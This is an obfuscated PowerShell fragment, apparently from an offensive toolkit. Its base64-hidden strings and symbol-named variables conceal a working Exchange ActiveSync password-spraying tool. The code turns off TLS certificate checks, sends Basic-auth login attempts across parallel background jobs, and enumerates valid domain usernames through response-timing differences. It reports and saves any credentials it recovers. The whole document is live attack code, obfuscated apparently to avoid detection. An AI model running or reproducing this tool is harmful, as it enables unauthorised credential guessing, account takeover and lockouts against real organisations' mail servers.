    ${__/=\/\_/===\__/=}=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIABuAGEAbQBlAHMAcABhAGMAZQAgAEwAbwBjAGEAbAAuAFQAbwBvAGwAawBpAHQARQB4AHQAZQBuAHMAaQBvAG4AcwAuAE4AZQB0AC4AQwBlAHIAdABpAGYAaQBjAGEAdABlAFAAbwBsAGkAYwB5AHsADQAKACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVAByAHUAcwB0AEEAbABsACAAOgAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBJAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBQAG8AbABpAGMAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAFQAcgB1AHMAdABBAGwAbAAoACkAIAB7ACAADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABiAG8AbwBsACAAQwBoAGUAYwBrAFYAYQBsAGkAZABhAHQAaQBvAG4AUgBlAHMAdQBsAHQAKABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQAIABzAHAALAANAAoAIAAgACAAIAAgACAAIAAgACAAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AWAA1ADAAOQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAuAFgANQAwADkAQwBlAHIAdABpAGYAaQBjAGEAdABlACAAYwBlAHIAdAAsACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAByAGUAcQAsACAAaQBuAHQAIABwAHIAbwBiAGwAZQBtACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAdAByAHUAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAB9AA=='))) 
    ${_/=\_/\_/=\___/\_}=${/==\__/=\/\/=\_/=}.CompileAssemblyFromSource(${__/\/\_/\_/\_/\__},${__/=\/\_/===\__/=})
    ${_/\_/======\__/==}=${_/=\_/\_/=\___/\_}.CompiledAssembly
    ${__/\_/==\________}=${_/\_/======\__/==}.CreateInstance($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAC4AVABvAG8AbABrAGkAdABFAHgAdABlAG4AcwBpAG8AbgBzAC4ATgBlAHQALgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUABvAGwAaQBjAHkALgBUAHIAdQBzAHQAQQBsAGwA'))))
    [System.Net.ServicePointManager]::CertificatePolicy=${__/\_/==\________}
    for( ${_/\/==\___/=\_/\_} = 0; ${_/\/==\___/=\_/\_} -lt 5; ${_/\/==\___/=\_/\_}++ ){
        ${______/=\__/\/\__} += -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
    }
    ${______/=\__/\/\__} += ${__/\_/=\_/=\_/\_/}
    ${/==\_/====\_/==\/} = ______/\/==\/==\_/ -___/==\____/\/=\_/ ${___/==\____/\/=\_/} -Domain $Domain
    ${/==\_/====\_/==\/} = ${/==\_/====\_/==\/}[-1]
    Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB2AGcAVABpAG0AZQA6ACAA'))) ${/==\_/====\_/==\/}
    ${_/=\/\_/====\/==\} = ${/==\_/====\_/==\/} * 0.6
    Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAHIAZQBzAGgAbwBsAGQAOgAgAA=='))) ${_/=\/\_/====\/==\}
    ${_/\/\/\/===\_/=\_} = @()
	Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAcABvAG4AcwBlACAAVABpAG0AZQAgACgATQBTACkAIAAJACAARABvAG0AYQBpAG4AXABVAHMAZQByAG4AYQBtAGUA')))
    ForEach($Username in ${______/=\__/\/\__})
    {
        ${/=\/\_/===\__/\/\} = $Domain + "\" + $Username
        ${/=\_/===\/==\_/=\} = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwAH0AOgB7ADEAfQA='))) -f ${/=\/\_/===\__/\/\}, $Password)))
        ${_/====\__/\____/=} = @{'Authorization' = "Basic $(${/=\_/===\/==\_/=\})"}
        ${_/==\_/==\____/==} = [system.diagnostics.stopwatch]::startNew()
		try {
			${/==\/=\_/\/==\/==} = iwr -Uri ${___/==\____/\/=\_/} -Headers ${_/====\__/\____/=} -Method Get -ErrorAction Stop
        }
		catch {
            ${__/==\/==\_/=====} = $_.Exception.Response.GetResponseStream()
            ${_/=\__/====\___/=} = New-Object System.IO.StreamReader(${__/==\/==\_/=====})
            ${_/=\__/====\___/=}.BaseStream.Position = 0
            ${_/=\__/====\___/=}.DiscardBufferedData()
            ${_____/\_/\___/===} = ${_/=\__/====\___/=}.ReadToEnd()
        }
		${/========\/==\_/\} = [double]${_/==\_/==\____/==}.ElapsedMilliseconds
 		Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADMAfQAgAAkACQAJAAkAIAAkAHsAMwA5AH0A')))
		if (${/========\/==\_/\} -le ${_/=\/\_/====\/==\})
        {
            Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAG8AdABlAG4AdABpAGEAbABsAHkAIABWAGEAbABpAGQAIQAgAFUAcwBlAHIAOgAkAHsAMwA5AH0A')))
            ${_/\/\/\/===\_/=\_} += ${/=\/\_/===\__/\/\}
        }
    }
    Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBACAAdABvAHQAYQBsACAAbwBmACAA'))) + ${_/\/\/\/===\_/=\_}.count + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABwAG8AdABlAG4AdABpAGEAbABsAHkAIAB2AGEAbABpAGQAIAB1AHMAZQByAG4AYQBtAGUAcwAgAGYAbwB1AG4AZAAuAA=='))))
    if ($OutFile -ne "")
       {
            ${_/\/\/\/===\_/=\_} | Out-File -Encoding ascii $OutFile
            Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAcwAgAGgAYQB2AGUAIABiAGUAZQBuACAAdwByAGkAdAB0AGUAbgAgAHQAbwAgACQATwB1AHQARgBpAGwAZQAuAA==')))
       }
}
function Invoke-PasswordSprayEAS{
  Param(
    [Parameter(Position = 0, Mandatory = $false)]
    [system.URI]
    $ExchHostname = "",
    [Parameter(Position = 1, Mandatory = $False)]
    [string]
    $OutFile = "",
    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $UserList = "",
    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $Password = "",
    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $Threads = "5",
    [Parameter(Position = 6, Mandatory = $False)]
    [string]
    $Domain = ""
  )
    Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAHMAcAByAGEAeQBpAG4AZwAgAEUAQQBTACAAYQB0ACAAaAB0AHQAcABzADoALwAvACQARQB4AGMAaABIAG8AcwB0AG4AYQBtAGUALwBNAGkAYwByAG8AcwBvAGYAdAAtAFMAZQByAHYAZQByAC0AQQBjAHQAaQB2AGUAUwB5AG4AYwAvAA==')))
    ${___/==\____/\/=\_/} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBNAGkAYwByAG8AcwBvAGYAdAAtAFMAZQByAHYAZQByAC0AQQBjAHQAaQB2AGUAUwB5AG4AYwA='))))
    ${__/\_/=\_/=\_/\_/} = gc $UserList
    ${/=\/====\_/\/=\/\} = ${__/\_/=\_/=\_/\_/}.count
    ${/=\/\_/\___/\/\__} = @()
    ${/=\_/\__/\/===\/\} = @{}
    ${/=\/====\_/\/=\/\} = 0 
	${__/\_/=\_/=\_/\_/} |% {${/=\_/\__/\/===\/\}[${/=\/====\_/\/=\/\} % $Threads] += @($_);${/=\/====\_/\/=\/\}++}
	${__/=\/=\_/\/\/\/\} = Get-Date -Format g
    Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQA6ACAA'))) ${__/=\/=\_/\/\/\/\}
	${____/=\_/==\/====} = [System.Diagnostics.Stopwatch]::StartNew()
    0..($Threads-1) |% {
    sajb -ScriptBlock{
    ${/==\__/=\/\/=\_/=}=New-Object Microsoft.CSharp.CSharpCodeProvider
    ${/\_____/=\__/\__/}=${/==\__/=\/\/=\_/=}.CreateCompiler()
    ${__/\/\_/\_/\_/\__}=New-Object System.CodeDom.Compiler.CompilerParameters
    ${__/\/\_/\_/\_/\__}.GenerateExecutable=$False
    ${__/\/\_/\_/\_/\__}.GenerateInMemory=$True
    ${__/\/\_/\_/\_/\__}.IncludeDebugInformation=$False
    ${__/\/\_/\_/\_/\__}.ReferencedAssemblies.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAEwATAA=')))) > $null
    ${__/=\/\_/===\__/=}=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIABuAGEAbQBlAHMAcABhAGMAZQAgAEwAbwBjAGEAbAAuAFQAbwBvAGwAawBpAHQARQB4AHQAZQBuAHMAaQBvAG4AcwAuAE4AZQB0AC4AQwBlAHIAdABpAGYAaQBjAGEAdABlAFAAbwBsAGkAYwB5AHsADQAKACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVAByAHUAcwB0AEEAbABsACAAOgAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBJAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBQAG8AbABpAGMAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAFQAcgB1AHMAdABBAGwAbAAoACkAIAB7ACAADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABiAG8AbwBsACAAQwBoAGUAYwBrAFYAYQBsAGkAZABhAHQAaQBvAG4AUgBlAHMAdQBsAHQAKABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQAIABzAHAALAANAAoAIAAgACAAIAAgACAAIAAgACAAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AWAA1ADAAOQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAuAFgANQAwADkAQwBlAHIAdABpAGYAaQBjAGEAdABlACAAYwBlAHIAdAAsACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAByAGUAcQAsACAAaQBuAHQAIABwAHIAbwBiAGwAZQBtACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAdAByAHUAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAB9AA=='))) 
    ${_/=\_/\_/=\___/\_}=${/==\__/=\/\/=\_/=}.CompileAssemblyFromSource(${__/\/\_/\_/\_/\__},${__/=\/\_/===\__/=})
    ${_/\_/======\__/==}=${_/=\_/\_/=\___/\_}.CompiledAssembly
    ${__/\_/==\________}=${_/\_/======\__/==}.CreateInstance($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAC4AVABvAG8AbABrAGkAdABFAHgAdABlAG4AcwBpAG8AbgBzAC4ATgBlAHQALgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUABvAGwAaQBjAHkALgBUAHIAdQBzAHQAQQBsAGwA'))))
    [System.Net.ServicePointManager]::CertificatePolicy=${__/\_/==\________}
    $Password = $args[1]
    ${___/==\____/\/=\_/} = $args[2]
    $Domain = $args[3]
    ForEach($Username in $args[0])
	{
      if ($Domain -ne "")
      {
        $Username = ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABEAG8AbQBhAGkAbgA='))) + "\" + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABVAHMAZQByAG4AYQBtAGUA'))))
      }
	  ${/===\/=\___/\_/\/} = ""
      ${/=\_/===\/==\_/=\} = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwAH0AOgB7ADEAfQA='))) -f $Username, $Password)))
      ${_/====\__/\____/=} = @{'Authorization' = "Basic $(${/=\_/===\/==\_/=\})"}
      try
	  {
        ${/==\/=\_/\/==\/==} = iwr -Uri ${___/==\____/\/=\_/} -Headers ${_/====\__/\____/=} -Method Get -SessionVariable sess -ErrorAction Stop
      }
      catch
	  {
        ${__/==\/==\_/=====} = $_.Exception.Response.GetResponseStream()
        ${_/=\__/====\___/=} = New-Object System.IO.StreamReader(${__/==\/==\_/=====})
        ${_/=\__/====\___/=}.BaseStream.Position = 0
        ${_/=\__/====\___/=}.DiscardBufferedData()
        ${_____/\_/\___/===} = ${_/=\__/====\___/=}.ReadToEnd()
        ${___/====\_/======} = $_.Exception.Response.StatusCode.Value__
      }
	  if (${___/====\_/======} -eq 505)
	  {
	    echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABTAFUAQwBDAEUAUwBTACEAIABVAHMAZQByADoAJAB1AHMAZQByAG4AYQBtAGUAIABQAGEAcwBzAHcAbwByAGQAOgAkAHAAYQBzAHMAdwBvAHIAZAA=')))	
	  } 
	${_____/=\__/\__/=\}+=1 
    }	
    }  -ArgumentList ${/=\_/\__/\/===\/\}[$_], $Password, ${___/==\____/\/=\_/}, $Domain | Out-Null
}
${__/==\/\__/=\/===} = Get-Date
${_/=\_/\_/========} = 10000
${_/=\_/==\__/=\/==} = 200
        ${_/\/\/\/===\_/=\_} = @()
While ($(gjb -State Running).count -gt 0)
{
  ${/===\__/=\/\_/\/\} = ""
  ForEach (${_/\/\/=\__/=\____}  in $(gjb -state running)){${/===\__/=\/\_/\/\} += ", $(${_/\/\/=\__/=\____}.name)"}
  ${/===\__/=\/\_/\/\} = ${/===\__/=\/\_/\/\}.Substring(2)
  Write-Progress  -Activity $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkACAAUwBwAHIAYQB5AGkAbgBnACAARQBBAFMAIABhAHQAIABoAHQAdABwAHMAOgAvAC8AJABFAHgAYwBoAEgAbwBzAHQAbgBhAG0AZQAvAE0AaQBjAHIAbwBzAG8AZgB0AC0AUwBlAHIAdgBlAHIALQBBAGMAdABpAHYAZQBTAHkAbgBjAC8ALgAgAFMAaQB0ACAAdABpAGcAaAB0AC4ALgAuAA=='))) -Status "$($(gjb -State Running).count) threads remaining" -PercentComplete ($(gjb -State Completed).count / $(gjb).count * 100)
  If ($(New-TimeSpan ${__/==\/\__/=\/===} $(Get-Date)).totalseconds -ge ${_/=\_/\_/========}){$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBpAGwAbABpAG4AZwAgAGEAbABsACAAagBvAGIAcwAgAHMAdABpAGwAbAAgAHIAdQBuAG4AaQBuAGcAIAAuACAALgAgAC4A')));gjb -State Running | rjb -Force}
    sleep -Milliseconds ${_/=\_/==\__/=\/==}
    ForEach(${_/\/\/=\__/=\____} in gjb){
      ${_/=\__/\_/\/=\/\_} = rcjb ${_/\/\/=\__/=\____}
      echo ${_/=\__/\_/\/=\/\_}
      ${_/\/\/\/===\_/=\_} += ${_/=\__/\_/\/=\/\_}
    }
}
echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBACAAdABvAHQAYQBsACAAbwBmACAA'))) + ${_/\/\/\/===\_/=\_}.count + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAB3AGUAcgBlACAAbwBiAHQAYQBpAG4AZQBkAC4A'))))
if ($OutFile -ne "")
  {
    ${_/\/\/\/===\_/=\_} = ${_/\/\/\/===\_/=\_} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABbAFwAKgBcAF0AIABTAFUAQwBDAEUAUwBTACEAIABVAHMAZQByADoA'))),''
    ${_/\/\/\/===\_/=\_} = ${_/\/\/\/===\_/=\_} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABQAGEAcwBzAHcAbwByAGQAOgA='))), ":"
    ${_/\/\/\/===\_/=\_} | Out-File -Encoding ascii $OutFile
    echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAcwAgAGgAYQB2AGUAIABiAGUAZQBuACAAdwByAGkAdAB0AGUAbgAgAHQAbwAgACQATwB1AHQARgBpAGwAZQAuAA==')))
  }
${_/\_/====\_/\___/} = ${____/=\_/==\/====}.Elapsed  
${____/=\_/==\/====}.Stop()
Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQAgAFQAYQBrAGUAbgA6ACAA'))) ${_/\_/====\_/\___/}
${__/=\/=\_/\/\/\/\} = Get-Date -Format g
Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQA6ACAA'))) ${__/=\/=\_/\/\/\/\}
}
function ______/\/==\/==\_/ {
    Param(
    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    ${___/==\____/\/=\_/} = "",
    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $Domain = ""
    )
    ${______/=\__/\/\__} = @()
    for(${_/\/==\___/=\_/\_} = 0; ${_/\/==\___/=\_/\_} -lt 5; ${_/\/==\___/=\_/\_}++) { 
        ${_____/\/===\__/\_} = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
        if( $Domain -eq "" ) {
            ${__/\/\__/=\/==\/=} = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
            ${______/=\__/\/\__} += ${__/\/\__/=\/==\/=} + "\" + ${_____/\/===\__/\_}
        }
        else {
            ${______/=\__/\/\__} += $Domain + "\" + ${_____/\/===\__/\_}
        }
    }
    $Password = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
    ${/==\_/====\_/==\/} = 0.0
    ${____/==\__/==\_/\} = 0.0
    Write-Host ""
    Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAZQByAG0AaQBuAGkAbgBnACAAYgBhAHMAZQBsAGkAbgBlACAAcgBlAHMAcABvAG4AcwBlACAAdABpAG0AZQAuAC4ALgA=')))
	Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAcABvAG4AcwBlACAAVABpAG0AZQAgACgATQBTACkAIAAJACAARABvAG0AYQBpAG4AXABVAHMAZQByAG4AYQBtAGUA')))
    ForEach($Username in ${______/=\__/\/\__})
    {
        ${/=\_/===\/==\_/=\} = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwAH0AOgB7ADEAfQA='))) -f $Username, $Password)))
        ${_/====\__/\____/=} = @{'Authorization' = "Basic $(${/=\_/===\/==\_/=\})"}
        try { ${/==\/=\_/\/==\/==} = iwr -Uri ${___/==\____/\/=\_/} -Headers ${_/====\__/\____/=} -Method Get } catch { $_.Exception.Response.GetResponseStream }  
        ${_/==\_/==\____/==} = [system.diagnostics.stopwatch]::startNew()
        try { ${/==\/=\_/\/==\/==} = iwr -Uri ${___/==\____/\/=\_/} -Headers ${_/====\__/\____/=} -Method Get } catch { $_.Exception.Response.GetResponseStream }
        ${/========\/==\_/\} = [double]${_/==\_/==\____/==}.ElapsedMilliseconds
        Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADMAfQAgAAkACQAJAAkAIAAkAFUAcwBlAHIAbgBhAG0AZQA=')))    
        ${____/==\__/==\_/\} += 1.0
        ${/==\_/====\_/==\/} += ${/========\/==\_/\}
    }
    ${/==\_/====\_/==\/} /= ${____/==\__/==\_/\}
    Write-Host ""
    Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CQAgAEIAYQBzAGUAbABpAG4AZQAgAFIAZQBzAHAAbwBuAHMAZQA6ACAAJAB7ADEAfQA=')))
    Write-Host ""
    return ${/==\_/====\_/==\/}
}